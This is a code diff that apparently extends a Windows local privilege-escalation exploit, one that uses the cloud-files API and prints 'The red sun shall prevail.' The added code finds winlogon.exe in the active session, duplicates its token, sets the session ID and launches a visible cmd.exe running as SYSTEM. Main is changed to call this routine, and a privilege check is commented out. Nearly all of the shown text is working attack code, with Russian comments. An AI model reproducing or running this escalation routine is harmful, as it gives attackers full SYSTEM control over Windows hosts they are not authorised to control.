@@ -16,6 +16,107 @@
 #pragma comment(lib,"CldApi.lib")
 
 
+#include <WtsApi32.h>
+
+#pragma comment(lib, "WtsApi32.lib")
+#pragma comment(lib, "Psapi.lib")
+
+DWORD GetProcessIdByName(const wchar_t* processName, DWORD sessionId) {
+    DWORD processes[1024], bytesReturned;
+    if (!EnumProcesses(processes, sizeof(processes), &bytesReturned)) return 0;
+    for (DWORD i = 0; i < bytesReturned / sizeof(DWORD); i++) {
+        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processes[i]);
+        if (hProc) {
+            wchar_t name[MAX_PATH] = {0};
+            if (GetModuleBaseNameW(hProc, NULL, name, MAX_PATH) && _wcsicmp(name, processName) == 0) {
+                DWORD procSessionId;
+                if (ProcessIdToSessionId(processes[i], &procSessionId) && procSessionId == sessionId) {
+                    CloseHandle(hProc);
+                    return processes[i];
+                }
+            }
+            CloseHandle(hProc);
+        }
+    }
+    return 0;
+}
+
+void SpawnSystemCommandPrompt() {
+    DWORD dwSessionId = WTSGetActiveConsoleSessionId();
+    if (dwSessionId == 0xFFFFFFFF) {
+        printf("[-] WTSGetActiveConsoleSessionId failed: %d\n", GetLastError());
+        return;
+    }
+    printf("[+] Active Console Session ID: %d\n", dwSessionId);
+
+    DWORD pid = GetProcessIdByName(L"winlogon.exe", dwSessionId);
+    if (!pid) {
+        printf("[-] Could not find winlogon.exe in session %d\n", dwSessionId);
+        return;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProcess) {
+        printf("[-] OpenProcess failed: %d\n", GetLastError());
+        return;
+    }
+
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken)) {
+        printf("[-] OpenProcessToken failed: %d\n", GetLastError());
+        CloseHandle(hProcess);
+        return;
+    }
+
+    HANDLE hDupToken = NULL;
+    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
+        printf("[-] DuplicateTokenEx failed: %d\n", GetLastError());
+        CloseHandle(hToken);
+        CloseHandle(hProcess);
+        return;
+    }
+
+    // Устанавливаем ID сессии для токена
+    if (!SetTokenInformation(hDupToken, TokenSessionId, &dwSessionId, sizeof(DWORD))) {
+        printf("[-] SetTokenInformation failed: %d\n", GetLastError());
+    } else {
+        printf("[+] Token session ID set to %d\n", dwSessionId);
+    }
+
+    STARTUPINFOW si = {0};
+    si.cb = sizeof(STARTUPINFOW);
+    si.lpDesktop = L"winsta0\\default";  // критично для видимости окна
+    si.wShowWindow = SW_SHOW;
+
+    PROCESS_INFORMATION pi = {0};
+
+    BOOL bRet = CreateProcessAsUserW(
+        hDupToken,
+        L"C:\\Windows\\System32\\cmd.exe",
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NEW_CONSOLE,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
+
+    if (bRet) {
+        printf("[+] SYSTEM command prompt spawned successfully!\n");
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        printf("[-] CreateProcessAsUser failed: %d\n", GetLastError());
+    }
+
+    CloseHandle(hDupToken);
+    CloseHandle(hToken);
+    CloseHandle(hProcess);
+}
+
 typedef struct _FILE_DISPOSITION_INFORMATION_EX {
     ULONG Flags;
 } FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;
@@ -573,7 +674,7 @@ bool IsRunningAsLocalSystem()
     }
     return ret;
 }
-bool r = IsRunningAsLocalSystem();
+//bool r = IsRunningAsLocalSystem();
 
 void LaunchTierManagementEng()
 {
@@ -759,6 +860,9 @@ int main()
     }
     printf("The red sun shall prevail.\n");
     
+    // ЗАПУСК ВИДИМОЙ КОМАНДНОЙ СТРОКИ ОТ SYSTEM
+    SpawnSystemCommandPrompt();
+
     CloseHandle(hlk);
     CloseHandle(hrp);
     
